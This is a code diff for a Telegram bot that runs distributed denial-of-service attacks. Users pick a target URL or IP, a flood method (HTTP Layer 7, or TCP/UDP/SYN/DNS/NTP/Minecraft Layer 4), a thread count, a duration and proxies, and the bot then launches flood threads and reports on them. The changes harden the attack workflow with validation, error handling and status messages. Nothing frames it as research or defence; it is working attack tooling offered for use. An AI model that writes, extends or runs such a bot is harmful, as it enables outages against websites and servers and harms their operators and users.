-- TCP, UDP, SYN, DNS, NTP, etc.
+💥 Layer 4 Methods: TCP/UDP-based attacks
+• TCP, UDP, SYN, DNS, NTP, etc.
 
-Tools: Network utilities
-- INFO, PING, CHECK, DSTAT, TSSRV
+🔧 Tools: Network utilities
+• INFO, PING, CHECK, DSTAT, TSSRV
+
+🔄 Proxy Manager: Update & manage proxies
+
+⚙️ System Limits:
+• Max Threads: {SYSTEM_MAX_THREADS}
+• Current Active: {active_count()}
 
 Use inline buttons to navigate and configure attacks.
 """
-            keyboard = [[InlineKeyboardButton("Back", callback_data="back_main")]]
-            await query.edit_message_text(
+            keyboard = [[InlineKeyboardButton("⬅️ Back", callback_data="back_main")]]
+            await self.safe_edit_message(
+                query,
                 help_text,
                 reply_markup=InlineKeyboardMarkup(keyboard)
             )
@@ -588,8 +1000,10 @@ Use inline buttons to navigate and configure attacks.
         
         elif data == "back_main":
             config.reset()
-            await query.edit_message_text(
-                "Main Menu - Select an option:",
+            self.user_state_context[user_id] = ""
+            await self.safe_edit_message(
+                query,
+                "🏠 Main Menu - Select an option:",
                 reply_markup=self.get_main_menu_keyboard()
             )
             return ConversationState.MAIN_MENU.value
@@ -598,8 +1012,10 @@ Use inline buttons to navigate and configure attacks.
         elif data.startswith("method_"):
             method = data.replace("method_", "")
             config.method = method
-            await query.edit_message_text(
-                f"Method: {method}\n\nEnter target URL/IP:"
+            self.user_state_context[user_id] = "enter_target"
+            await self.safe_edit_message(
+                query,
+                f"⚡ Method: {method}\n\n📝 Enter target URL/IP:"
             )
             return ConversationState.ENTER_TARGET.value
         
@@ -607,12 +1023,27 @@ Use inline buttons to navigate and configure attacks.
         elif data.startswith("threads_"):
             value = data.replace("threads_", "")
             if value == "custom":
-                await query.edit_message_text("Enter custom thread count:")
+                self.user_state_context[user_id] = "enter_threads"
+                await self.safe_edit_message(
+                    query,
+                    f"📝 Enter custom thread count:\n\n⚠️ System max: {SYSTEM_MAX_THREADS}"
+                )
                 return ConversationState.ENTER_THREADS.value
             else:
-                config.threads = int(value)
-                await query.edit_message_text(
-                    f"Threads: {config.threads}\n\nSelect duration:",
+                thread_count = int(value)
+                # Validate against system limit
+                if thread_count > SYSTEM_MAX_THREADS:
+                    await self.safe_edit_message(
+                        query,
+                        f"⚠️ {thread_count} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\nPlease select a lower value:",
+                        reply_markup=self.get_threads_keyboard()
+                    )
+                    return ConversationState.ENTER_THREADS.value
+                
+                config.threads = thread_count
+                await self.safe_edit_message(
+                    query,
+                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
                     reply_markup=self.get_duration_keyboard()
                 )
                 return ConversationState.ENTER_DURATION.value
@@ -621,20 +1052,33 @@ Use inline buttons to navigate and configure attacks.
         elif data.startswith("duration_"):
             value = data.replace("duration_", "")
             if value == "custom":
-                await query.edit_message_text("Enter custom duration (seconds):")
+                self.user_state_context[user_id] = "enter_duration"
+                await self.safe_edit_message(query, "📝 Enter custom duration (seconds):")
                 return ConversationState.ENTER_DURATION.value
             else:
                 config.duration = int(value)
                 if config.is_layer7:
-                    await query.edit_message_text(
-                        f"Duration: {config.duration}s\n\nSelect RPC (Requests Per Connection):",
+                    await self.safe_edit_message(
+                        query,
+                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC (Requests Per Connection):",
                         reply_markup=self.get_rpc_keyboard()
                     )
                     return ConversationState.ENTER_RPC.value
                 else:
                     # Layer 4 doesn't need RPC, go to confirmation
-                    await query.edit_message_text(
-                        self.format_config_summary(config) + "\n\nConfirm attack?",
+                    # Validate config before showing confirmation
+                    is_valid, error_msg = config.validate()
+                    if not is_valid:
+                        await self.safe_edit_message(
+                            query,
+                            f"⚠️ Configuration Error: {error_msg}\n\nReturning to main menu...",
+                            reply_markup=self.get_main_menu_keyboard()
+                        )
+                        return ConversationState.MAIN_MENU.value
+                    
+                    await self.safe_edit_message(
+                        query,
+                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                         reply_markup=self.get_confirm_keyboard()
                     )
                     return ConversationState.CONFIRM_ATTACK.value
@@ -643,38 +1087,66 @@ Use inline buttons to navigate and configure attacks.
         elif data.startswith("rpc_"):
             value = data.replace("rpc_", "")
             if value == "custom":
-                await query.edit_message_text("Enter custom RPC value:")
+                self.user_state_context[user_id] = "enter_rpc"
+                await self.safe_edit_message(query, "📝 Enter custom RPC value:")
                 return ConversationState.ENTER_RPC.value
             else:
                 config.rpc = int(value)
-                await query.edit_message_text(
-                    f"RPC: {config.rpc}\n\nSelect proxy type:",
+                await self.safe_edit_message(
+                    query,
+                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
                     reply_markup=self.get_proxy_type_keyboard()
                 )
                 return ConversationState.SELECT_PROXY_TYPE.value
         
-        # Proxy type selection
-        elif data.startswith("proxy_"):
+        # Proxy type selection (for attack configuration, not manager)
+        elif data.startswith("proxy_") and not data.startswith("proxy_update_") and data not in ["proxy_manager", "proxy_stats"]:
             value = data.replace("proxy_", "")
             if value == "none":
                 config.proxy_type = -1
             else:
-                config.proxy_type = int(value)
-            await query.edit_message_text(
-                self.format_config_summary(config) + "\n\nConfirm attack?",
+                try:
+                    config.proxy_type = int(value)
+                except ValueError:
+                    config.proxy_type = 0
+            
+            # Validate config before showing confirmation
+            is_valid, error_msg = config.validate()
+            if not is_valid:
+                await self.safe_edit_message(
+                    query,
+                    f"⚠️ Configuration Error: {error_msg}\n\nReturning to main menu...",
+                    reply_markup=self.get_main_menu_keyboard()
+                )
+                return ConversationState.MAIN_MENU.value
+            
+            await self.safe_edit_message(
+                query,
+                self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                 reply_markup=self.get_confirm_keyboard()
             )
             return ConversationState.CONFIRM_ATTACK.value
         
         # Confirmation
         elif data == "confirm_start":
+            # Validate config before starting
+            is_valid, error_msg = config.validate()
+            if not is_valid:
+                await self.safe_edit_message(
+                    query,
+                    f"⚠️ Cannot start attack: {error_msg}",
+                    reply_markup=self.get_main_menu_keyboard()
+                )
+                return ConversationState.MAIN_MENU.value
+            
             await self.start_attack(query, user_id, config)
             return ConversationState.MAIN_MENU.value
         
         elif data == "confirm_cancel":
             config.reset()
-            await query.edit_message_text(
-                "Attack cancelled.\n\nMain Menu:",
+            await self.safe_edit_message(
+                query,
+                "❌ Attack cancelled.\n\n🏠 Main Menu:",
                 reply_markup=self.get_main_menu_keyboard()
             )
             return ConversationState.MAIN_MENU.value
@@ -685,14 +1157,18 @@ Use inline buttons to navigate and configure attacks.
                 session = self.active_sessions[user_id]
                 session.event.clear()
                 session.is_running = False
+                if session.monitor_task and not session.monitor_task.done():
+                    session.monitor_task.cancel()
                 del self.active_sessions[user_id]
-                await query.edit_message_text(
-                    "Attack stopped.\n\nMain Menu:",
+                await self.safe_edit_message(
+                    query,
+                    "🛑 Attack stopped.\n\n🏠 Main Menu:",
                     reply_markup=self.get_main_menu_keyboard()
                 )
             else:
-                await query.edit_message_text(
-                    "No active attacks.\n\nMain Menu:",
+                await self.safe_edit_message(
+                    query,
+                    "📭 No active attacks.\n\n🏠 Main Menu:",
                     reply_markup=self.get_main_menu_keyboard()
                 )
             return ConversationState.MAIN_MENU.value
@@ -701,20 +1177,28 @@ Use inline buttons to navigate and configure attacks.
         elif data.startswith("tool_"):
             tool = data.replace("tool_", "")
             self.user_tools_context[user_id] = tool
+            self.user_state_context[user_id] = f"tool_{tool}"
             
             if tool == "dstat":
                 await self.run_dstat(query)
                 return ConversationState.TOOLS_MENU.value
             else:
                 prompts = {
-                    "info": "Enter IP address or domain:",
-                    "ping": "Enter IP address or domain:",
-                    "check": "Enter URL to check (include http:// or https://):",
-                    "tssrv": "Enter domain for TeamSpeak SRV lookup:",
+                    "info": "🌐 Enter IP address or domain:",
+                    "ping": "📡 Enter IP address or domain:",
+                    "check": "✔️ Enter URL to check (include http:// or https://):",
+                    "tssrv": "🎮 Enter domain for TeamSpeak SRV lookup:",
                 }
-                await query.edit_message_text(prompts.get(tool, "Enter target:"))
+                await self.safe_edit_message(query, prompts.get(tool, "📝 Enter target:"))
                 return ConversationState.TOOLS_INPUT.value
         
+        # Unknown callback - return to main menu
+        logger.warning(f"Unknown callback data: {data}")
+        await self.safe_edit_message(
+            query,
+            "⚠️ Unknown command. Returning to main menu...",
+            reply_markup=self.get_main_menu_keyboard()
+        )
         return ConversationState.MAIN_MENU.value
     
     async def handle_text_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -723,8 +1207,23 @@ Use inline buttons to navigate and configure attacks.
         config = self.get_user_config(user_id)
         text = update.message.text.strip()
         
-        # Check current state based on config
-        if not config.target and config.method:
+        try:
+            return await self._process_text_input(update, user_id, config, text)
+        except Exception as e:
+            logger.error(f"Error in handle_text_input: {e}\n{traceback.format_exc()}")
+            await self.safe_reply(
+                update.message,
+                f"⚠️ Error processing input: {str(e)}\n\nReturning to main menu...",
+                reply_markup=self.get_main_menu_keyboard()
+            )
+            return ConversationState.MAIN_MENU.value
+    
+    async def _process_text_input(self, update: Update, user_id: int, config: AttackConfig, text: str) -> int:
+        """Process text input. Separated for better error handling."""
+        state_context = self.user_state_context.get(user_id, "")
+        
+        # Handle based on explicit state context
+        if state_context == "enter_target" or (not config.target and config.method):
             # Entering target
             target = text
             
@@ -740,95 +1239,206 @@ Use inline buttons to navigate and configure attacks.
                 url = URL(target)
                 config.target = url.host
                 config.port = url.port or 80
+                self.user_state_context[user_id] = ""  # Clear context
                 
                 if config.is_layer7:
                     # Try to resolve hostname
                     if config.method != "TOR":
                         try:
                             gethostbyname(url.host)
-                        except Exception:
-                            await update.message.reply_text(
-                                "Cannot resolve hostname. Please enter a valid target:",
+                        except Exception as e:
+                            await self.safe_reply(
+                                update.message,
+                                f"⚠️ Cannot resolve hostname: {str(e)}\n\n📝 Please enter a valid target:"
                             )
                             return ConversationState.ENTER_TARGET.value
                     
-                    await update.message.reply_text(
-                        f"Target: {config.target}\n\nSelect thread count:",
+                    await self.safe_reply(
+                        update.message,
+                        f"🎯 Target: {config.target}\n\n{self.get_threads_prompt()}",
                         reply_markup=self.get_threads_keyboard()
                     )
                     return ConversationState.ENTER_THREADS.value
                 else:
                     # Layer 4 - ask for port if not in URL
                     if not url.port:
-                        await update.message.reply_text(
-                            f"Target: {config.target}\n\nEnter port (1-65535):"
+                        self.user_state_context[user_id] = "enter_port"
+                        await self.safe_reply(
+                            update.message,
+                            f"🎯 Target: {config.target}\n\n🔌 Enter port (1-65535):"
                         )
                         return ConversationState.ENTER_PORT.value
                     else:
-                        await update.message.reply_text(
-                            f"Target: {config.target}:{config.port}\n\nSelect thread count:",
+                        await self.safe_reply(
+                            update.message,
+                            f"🎯 Target: {config.target}:{config.port}\n\n{self.get_threads_prompt()}",
                             reply_markup=self.get_threads_keyboard()
                         )
                         return ConversationState.ENTER_THREADS.value
                         
             except Exception as e:
-                await update.message.reply_text(
-                    f"Invalid target format. Please enter a valid URL or IP:\n{str(e)}"
+                await self.safe_reply(
+                    update.message,
+                    f"⚠️ Invalid target format: {str(e)}\n\n📝 Please enter a valid URL or IP:"
                 )
                 return ConversationState.ENTER_TARGET.value
         
-        elif config.target and not config.port and not config.is_layer7:
+        elif state_context == "enter_port" or (config.target and config.port == 80 and not config.is_layer7):
             # Entering port for Layer 4
             try:
                 port = int(text)
                 if 1 <= port <= 65535:
                     config.port = port
-                    await update.message.reply_text(
-                        f"Port: {config.port}\n\nSelect thread count:",
+                    self.user_state_context[user_id] = ""
+                    await self.safe_reply(
+                        update.message,
+                        f"🔌 Port: {config.port}\n\n{self.get_threads_prompt()}",
                         reply_markup=self.get_threads_keyboard()
                     )
                     return ConversationState.ENTER_THREADS.value
                 else:
-                    await update.message.reply_text("Port must be between 1 and 65535. Enter port:")
+                    await self.safe_reply(update.message, "⚠️ Port must be between 1 and 65535. Enter port:")
                     return ConversationState.ENTER_PORT.value
             except ValueError:
-                await update.message.reply_text("Invalid port. Enter a number between 1-65535:")
+                await self.safe_reply(update.message, "⚠️ Invalid port. Enter a number between 1-65535:")
                 return ConversationState.ENTER_PORT.value
         
-        # Check for custom threads input
+        elif state_context == "enter_threads":
+            # Custom threads input
+            try:
+                value = int(text)
+                if value < 1:
+                    await self.safe_reply(update.message, "⚠️ Thread count must be at least 1. Enter thread count:")
+                    return ConversationState.ENTER_THREADS.value
+                if value > SYSTEM_MAX_THREADS:
+                    await self.safe_reply(
+                        update.message,
+                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
+                    )
+                    return ConversationState.ENTER_THREADS.value
+                
+                config.threads = value
+                self.user_state_context[user_id] = ""
+                await self.safe_reply(
+                    update.message,
+                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
+                    reply_markup=self.get_duration_keyboard()
+                )
+                return ConversationState.ENTER_DURATION.value
+            except ValueError:
+                await self.safe_reply(update.message, "⚠️ Invalid number. Enter thread count:")
+                return ConversationState.ENTER_THREADS.value
+        
+        elif state_context == "enter_duration":
+            # Custom duration input
+            try:
+                value = int(text)
+                if value < 1:
+                    await self.safe_reply(update.message, "⚠️ Duration must be at least 1 second. Enter duration:")
+                    return ConversationState.ENTER_DURATION.value
+                
+                config.duration = value
+                self.user_state_context[user_id] = ""
+                
+                if config.is_layer7:
+                    await self.safe_reply(
+                        update.message,
+                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC:",
+                        reply_markup=self.get_rpc_keyboard()
+                    )
+                    return ConversationState.ENTER_RPC.value
+                else:
+                    # Validate before confirmation
+                    is_valid, error_msg = config.validate()
+                    if not is_valid:
+                        await self.safe_reply(
+                            update.message,
+                            f"⚠️ Configuration Error: {error_msg}",
+                            reply_markup=self.get_main_menu_keyboard()
+                        )
+                        return ConversationState.MAIN_MENU.value
+                    
+                    await self.safe_reply(
+                        update.message,
+                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
+                        reply_markup=self.get_confirm_keyboard()
+                    )
+                    return ConversationState.CONFIRM_ATTACK.value
+            except ValueError:
+                await self.safe_reply(update.message, "⚠️ Invalid number. Enter duration in seconds:")
+                return ConversationState.ENTER_DURATION.value
+        
+        elif state_context == "enter_rpc":
+            # Custom RPC input
+            try:
+                value = int(text)
+                if value < 1:
+                    await self.safe_reply(update.message, "⚠️ RPC must be at least 1. Enter RPC value:")
+                    return ConversationState.ENTER_RPC.value
+                
+                config.rpc = value
+                self.user_state_context[user_id] = ""
+                await self.safe_reply(
+                    update.message,
+                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
+                    reply_markup=self.get_proxy_type_keyboard()
+                )
+                return ConversationState.SELECT_PROXY_TYPE.value
+            except ValueError:
+                await self.safe_reply(update.message, "⚠️ Invalid number. Enter RPC value:")
+                return ConversationState.ENTER_RPC.value
+        
+        # Fallback for numeric input based on config state (backward compatibility)
         elif text.isdigit() and config.target:
             value = int(text)
             
-            # Could be threads, duration, or RPC
+            # Could be threads, duration, or RPC - determine from defaults
             if config.threads == 100:  # Default, likely entering custom threads
+                if value > SYSTEM_MAX_THREADS:
+                    await self.safe_reply(
+                        update.message,
+                        f"⚠️ {value} threads exceeds system limit ({SYSTEM_MAX_THREADS}).\n\n📝 Enter a lower value:"
+                    )
+                    return ConversationState.ENTER_THREADS.value
+                
                 config.threads = value
-                await update.message.reply_text(
-                    f"Threads: {config.threads}\n\nSelect duration:",
+                await self.safe_reply(
+                    update.message,
+                    f"🧵 Threads: {config.threads}\n\n⏱️ Select duration:",
                     reply_markup=self.get_duration_keyboard()
                 )
                 return ConversationState.ENTER_DURATION.value
             elif config.duration == 60:  # Default, likely entering custom duration
                 config.duration = value
                 if config.is_layer7:
-                    await update.message.reply_text(
-                        f"Duration: {config.duration}s\n\nSelect RPC:",
+                    await self.safe_reply(
+                        update.message,
+                        f"⏱️ Duration: {config.duration}s\n\n🔄 Select RPC:",
                         reply_markup=self.get_rpc_keyboard()
                     )
                     return ConversationState.ENTER_RPC.value
                 else:
-                    await update.message.reply_text(
-                        self.format_config_summary(config) + "\n\nConfirm attack?",
+                    await self.safe_reply(
+                        update.message,
+                        self.format_config_summary(config) + "\n\n❓ Confirm attack?",
                         reply_markup=self.get_confirm_keyboard()
                     )
                     return ConversationState.CONFIRM_ATTACK.value
             elif config.is_layer7 and config.rpc == 1:  # Default, likely entering custom RPC
                 config.rpc = value
-                await update.message.reply_text(
-                    f"RPC: {config.rpc}\n\nSelect proxy type:",
+                await self.safe_reply(
+                    update.message,
+                    f"🔄 RPC: {config.rpc}\n\n🔒 Select proxy type:",
                     reply_markup=self.get_proxy_type_keyboard()
                 )
                 return ConversationState.SELECT_PROXY_TYPE.value
         
+        # Unknown input - prompt user
+        await self.safe_reply(
+            update.message,
+            "❓ I didn't understand that. Please use the menu buttons.",
+            reply_markup=self.get_main_menu_keyboard()
+        )
         return ConversationState.MAIN_MENU.value
     
     async def handle_tools_input(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -838,92 +1448,125 @@ Use inline buttons to navigate and configure attacks.
         target = update.message.text.strip()
         
         if not target:
-            await update.message.reply_text(
-                "Invalid input. Try again.",
+            await self.safe_reply(
+                update.message,
+                "⚠️ Invalid input. Please try again.",
                 reply_markup=self.get_tools_keyboard()
             )
             return ConversationState.TOOLS_MENU.value
         
+        try:
+            return await self._process_tools_input(update, tool, target)
+        except Exception as e:
+            logger.error(f"Error in handle_tools_input: {e}\n{traceback.format_exc()}")
+            await self.safe_reply(
+                update.message,
+                f"⚠️ Tool error: {str(e)}",
+                reply_markup=self.get_tools_keyboard()
+            )
+            return ConversationState.TOOLS_MENU.value
+    
+    async def _process_tools_input(self, update: Update, tool: str, target: str) -> int:
+        """Process tools input. Separated for better error handling."""
         # Clean up target
         domain = target.replace('https://', '').replace('http://', '')
         if "/" in domain:
             domain = domain.split("/")[0]
         
         if tool == "info":
-            await update.message.reply_text("Fetching information...")
-            info = ToolsConsole.info(domain)
-            if info.get("success", True):
-                result = f"""
-IP Information for {domain}:
----------------------------
-Country: {info.get('country', 'N/A')}
-City: {info.get('city', 'N/A')}
-Region: {info.get('region', 'N/A')}
-ISP: {info.get('isp', 'N/A')}
-Org: {info.get('org', 'N/A')}
+            await self.safe_reply(update.message, "🔍 Fetching information...")
+            try:
+                info = ToolsConsole.info(domain)
+                if info.get("success", True):
+                    result = f"""
+🌐 IP Information for {domain}:
+-----------------------------
+🌍 Country: {info.get('country', 'N/A')}
+🏙️ City: {info.get('city', 'N/A')}
+📍 Region: {info.get('region', 'N/A')}
+🏢 ISP: {info.get('isp', 'N/A')}
+🏛️ Org: {info.get('org', 'N/A')}
 """
-            else:
-                result = f"Failed to get information for {domain}"
+                else:
+                    result = f"⚠️ Failed to get information for {domain}"
+            except Exception as e:
+                result = f"⚠️ Info lookup failed: {str(e)}"
             
-            await update.message.reply_text(
+            await self.safe_reply(
+                update.message,
                 result,
                 reply_markup=self.get_tools_keyboard()
             )
         
         elif tool == "ping":
-            await update.message.reply_text("Pinging...")
+            await self.safe_reply(update.message, "📡 Pinging...")
             try:
                 r = icmp_ping(domain, count=5, interval=0.2)
+                status_emoji = "🟢" if r.is_alive else "🔴"
                 result = f"""
-Ping Results for {domain}:
--------------------------
-Address: {r.address}
-Ping: {r.avg_rtt:.2f}ms
-Packets: {r.packets_received}/{r.packets_sent}
-Status: {"ONLINE" if r.is_alive else "OFFLINE"}
+📡 Ping Results for {domain}:
+---------------------------
+🌐 Address: {r.address}
+⏱️ Ping: {r.avg_rtt:.2f}ms
+📦 Packets: {r.packets_received}/{r.packets_sent}
+{status_emoji} Status: {"ONLINE" if r.is_alive else "OFFLINE"}
 """
             except Exception as e:
-                result = f"Ping failed: {str(e)}"
+                result = f"⚠️ Ping failed: {str(e)}"
             
-            await update.message.reply_text(
+            await self.safe_reply(
+                update.message,
                 result,
                 reply_markup=self.get_tools_keyboard()
             )
         
         elif tool == "check":
-            await update.message.reply_text("Checking...")
-            result = ""
+            await self.safe_reply(update.message, "✔️ Checking...")
             try:
                 url = target if target.startswith("http") else f"http://{target}"
                 r = requests_get(url, timeout=20)
                 try:
+                    status_emoji = "🟢" if r.status_code <= 500 else "🔴"
                     result = f"""
-Website Check for {url}:
------------------------
-Status Code: {r.status_code}
-Status: {"ONLINE" if r.status_code <= 500 else "OFFLINE"}
+✔️ Website Check for {url}:
+-------------------------
+📊 Status Code: {r.status_code}
+{status_emoji} Status: {"ONLINE" if r.status_code <= 500 else "OFFLINE"}
 """
                 finally:
                     r.close()
             except Exception as e:
-                result = f"Check failed: {str(e)}"
+                result = f"⚠️ Check failed: {str(e)}"
             
-            await update.message.reply_text(
+            await self.safe_reply(
+                update.message,
                 result,
                 reply_markup=self.get_tools_keyboard()
             )
         
         elif tool == "tssrv":
-            await update.message.reply_text("Looking up SRV records...")
-            info = ToolsConsole.ts_srv(domain)
-            result = f"""
-TeamSpeak SRV for {domain}:
---------------------------
-TCP: {info.get('_tsdns._tcp.', 'Not found')}
-UDP: {info.get('_ts3._udp.', 'Not found')}
+            await self.safe_reply(update.message, "🎮 Looking up SRV records...")
+            try:
+                info = ToolsConsole.ts_srv(domain)
+                result = f"""
+🎮 TeamSpeak SRV for {domain}:
+----------------------------
+🔵 TCP: {info.get('_tsdns._tcp.', 'Not found')}
+🟣 UDP: {info.get('_ts3._udp.', 'Not found')}
 """
-            await update.message.reply_text(
+            except Exception as e:
+                result = f"⚠️ TSSRV lookup failed: {str(e)}"
+            
+            await self.safe_reply(
+                update.message,
                 result,
+                reply_markup=self.get_tools_keyboard()
+            )
+        
+        else:
+            await self.safe_reply(
+                update.message,
+                "⚠️ Unknown tool. Please select from the menu.",
                 reply_markup=self.get_tools_keyboard()
             )
         
@@ -931,28 +1574,49 @@ UDP: {info.get('_ts3._udp.', 'Not found')}
     
     async def run_dstat(self, query) -> None:
         """Run DSTAT tool."""
-        nd = net_io_counters(pernic=False)
-        result = f"""
-Network Statistics:
-------------------
-Bytes Sent: {Tools.humanbytes(nd.bytes_sent)}
-Bytes Received: {Tools.humanbytes(nd.bytes_recv)}
-Packets Sent: {Tools.humanformat(nd.packets_sent)}
-Packets Received: {Tools.humanformat(nd.packets_recv)}
-Errors In: {nd.errin}
-Errors Out: {nd.errout}
-Drop In: {nd.dropin}
-Drop Out: {nd.dropout}
-CPU Usage: {cpu_percent()}%
-Memory: {virtual_memory().percent}%
+        try:
+            nd = net_io_counters(pernic=False)
+            result = f"""
+📊 Network Statistics:
+---------------------
+📤 Bytes Sent: {Tools.humanbytes(nd.bytes_sent)}
+📥 Bytes Received: {Tools.humanbytes(nd.bytes_recv)}
+📦 Packets Sent: {Tools.humanformat(nd.packets_sent)}
+📬 Packets Received: {Tools.humanformat(nd.packets_recv)}
+⚠️ Errors In: {nd.errin}
+⚠️ Errors Out: {nd.errout}
+🔻 Drop In: {nd.dropin}
+🔻 Drop Out: {nd.dropout}
+💻 CPU Usage: {cpu_percent()}%
+🧠 Memory: {virtual_memory().percent}%
+🧵 Active Threads: {active_count()}
+📈 Max Threads: {SYSTEM_MAX_THREADS}
 """
-        await query.edit_message_text(
-            result,
-            reply_markup=self.get_tools_keyboard()
-        )
+            await self.safe_edit_message(
+                query,
+                result,
+                reply_markup=self.get_tools_keyboard()
+            )
+        except Exception as e:
+            logger.error(f"Error in run_dstat: {e}")
+            await self.safe_edit_message(
+                query,
+                f"⚠️ DSTAT error: {str(e)}",
+                reply_markup=self.get_tools_keyboard()
+            )
     
     async def start_attack(self, query, user_id: int, config: AttackConfig) -> None:
         """Start the attack with given configuration."""
+        # Validate configuration
+        is_valid, error_msg = config.validate()
+        if not is_valid:
+            await self.safe_edit_message(
+                query,
+                f"⚠️ Cannot start attack: {error_msg}",
+                reply_markup=self.get_main_menu_keyboard()
+            )
+            return
+        
         # Stop any existing attack and cancel its monitor task
         if user_id in self.active_sessions:
             old_session = self.active_sessions[user_id]
@@ -976,6 +1640,8 @@ Memory: {virtual_memory().percent}%
         BYTES_SEND.set(0)
         
         try:
+            await self.safe_edit_message(query, "🚀 Starting attack... Please wait.")
+            
             if config.is_layer7:
                 await self._start_layer7_attack(query, session)
             else:
@@ -985,11 +1651,14 @@ Memory: {virtual_memory().percent}%
             session.monitor_task = asyncio.create_task(self._monitor_attack(query, user_id, session))
             
         except Exception as e:
+            logger.error(f"Attack failed to start: {e}\n{traceback.format_exc()}")
             session.event.clear()
             session.is_running = False
-            del self.active_sessions[user_id]
-            await query.edit_message_text(
-                f"Attack failed to start: {str(e)}\n\nMain Menu:",
+            if user_id in self.active_sessions:
+                del self.active_sessions[user_id]
+            await self.safe_edit_message(
+                query,
+                f"⚠️ Attack failed to start:\n{str(e)}\n\n🏠 Main Menu:",
                 reply_markup=self.get_main_menu_keyboard()
             )
     
@@ -1006,7 +1675,7 @@ Memory: {virtual_memory().percent}%
             try:
                 host = gethostbyname(url.host)
             except Exception as e:
-                raise Exception(f"Cannot resolve hostname: {str(e)}")
+                raise BotError(f"Cannot resolve hostname: {str(e)}")
         
         # Load user agents and referers
         useragent_li = __dir__ / "files/useragent.txt"
@@ -1015,33 +1684,53 @@ Memory: {virtual_memory().percent}%
         uagents = set()
         referers = set()
         
-        if useragent_li.exists():
-            uagents = set(a.strip() for a in useragent_li.open("r").readlines() if a.strip())
-        if referers_li.exists():
-            referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
+        try:
+            if useragent_li.exists():
+                uagents = set(a.strip() for a in useragent_li.open("r").readlines() if a.strip())
+            if referers_li.exists():
+                referers = set(a.strip() for a in referers_li.open("r").readlines() if a.strip())
+        except Exception as e:
+            logger.warning(f"Failed to load useragents/referers: {e}")
         
         # Handle proxies using PyRoxy (same as CLI)
         proxies = None
+        proxy_msg = ""
         if config.proxy_type >= 0:
-            proxies = await handle_proxy_list(config.proxy_type, config.threads, url)
+            proxies, proxy_msg = await handle_proxy_list(config.proxy_type, min(config.threads, 100), url)
         
-        # Start threads
+        # Start threads with error tracking
+        started_threads = 0
         for thread_id in range(config.threads):
-            t = HttpFlood(
-                thread_id, url, host, config.method, config.rpc,
-                session.event, uagents, referers, proxies
-            )
-            t.start()
-            session.threads.append(t)
+            try:
+                t = HttpFlood(
+                    thread_id, url, host, config.method, config.rpc,
+                    session.event, uagents, referers, proxies
+                )
+                t.start()
+                session.threads.append(t)
+                started_threads += 1
+            except Exception as e:
+                session.error_count += 1
+                session.last_error = str(e)
+                logger.warning(f"Failed to start thread {thread_id}: {e}")
+                if started_threads == 0:
+                    raise BotError(f"Failed to start any threads: {e}")
         
         session.event.set()
         session.is_running = True
         
-        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else "\nProxies: None"
-        await query.edit_message_text(
-            f"Attack started!\n\nTarget: {config.target}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
-            reply_markup=self.get_stop_keyboard()
+        proxy_info = f"\n🔒 Proxies: {len(proxies):,}" if proxies else "\n🔒 Proxies: None"
+        thread_info = f"\n⚠️ Started {started_threads}/{config.threads} threads" if started_threads < config.threads else ""
+        
+        msg = (
+            f"🚀 Attack Started!\n\n"
+            f"🎯 Target: {config.target}\n"
+            f"⚡ Method: {config.method}\n"
+            f"🧵 Threads: {started_threads}\n"
+            f"⏱️ Duration: {config.duration}s{proxy_info}{thread_info}\n\n"
+            f"Use 🔄 Refresh Status to see progress."
         )
+        await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
     
     async def _start_layer4_attack(self, query, session: AttackSession) -> None:
         """Start Layer 4 attack."""
@@ -1051,65 +1740,120 @@ Memory: {virtual_memory().percent}%
         try:
             target = gethostbyname(target)
         except Exception as e:
-            raise Exception(f"Cannot resolve hostname: {str(e)}")
+            raise BotError(f"Cannot resolve hostname: {str(e)}")
         
         # Handle proxies for supported methods using PyRoxy (same as CLI)
         proxies = None
+        proxy_msg = ""
         if config.method in {"MINECRAFT", "MCBOT", "TCP", "CPS", "CONNECTION"} and config.proxy_type >= 0:
-            proxies = await handle_proxy_list(config.proxy_type, config.threads)
+            proxies, proxy_msg = await handle_proxy_list(config.proxy_type, min(config.threads, 100))
         
-        # Start threads
+        # Start threads with error tracking
+        started_threads = 0
         for _ in range(config.threads):
-            t = Layer4(
-                (target, config.port), None, config.method,
-                session.event, proxies, con.get("MINECRAFT_DEFAULT_PROTOCOL", 47)
-            )
-            t.start()
-            session.threads.append(t)
+            try:
+                t = Layer4(
+                    (target, config.port), None, config.method,
+                    session.event, proxies, con.get("MINECRAFT_DEFAULT_PROTOCOL", 47)
+                )
+                t.start()
+                session.threads.append(t)
+                started_threads += 1
+            except Exception as e:
+                session.error_count += 1
+                session.last_error = str(e)
+                logger.warning(f"Failed to start Layer4 thread: {e}")
+                if started_threads == 0:
+                    raise BotError(f"Failed to start any threads: {e}")
         
         session.event.set()
         session.is_running = True
         
-        proxy_info = f"\nProxies: {len(proxies):,}" if proxies else ""
-        await query.edit_message_text(
-            f"Attack started!\n\nTarget: {target}:{config.port}\nMethod: {config.method}\nThreads: {config.threads}\nDuration: {config.duration}s{proxy_info}",
-            reply_markup=self.get_stop_keyboard()
+        proxy_info = f"\n🔒 Proxies: {len(proxies):,}" if proxies else ""
+        thread_info = f"\n⚠️ Started {started_threads}/{config.threads} threads" if started_threads < config.threads else ""
+        
+        msg = (
+            f"🚀 Attack Started!\n\n"
+            f"🎯 Target: {target}:{config.port}\n"
+            f"⚡ Method: {config.method}\n"
+            f"🧵 Threads: {started_threads}\n"
+            f"⏱️ Duration: {config.duration}s{proxy_info}{thread_info}\n\n"
+            f"Use 🔄 Refresh Status to see progress."
         )
+        await self.safe_edit_message(query, msg, reply_markup=self.get_stop_keyboard())
     
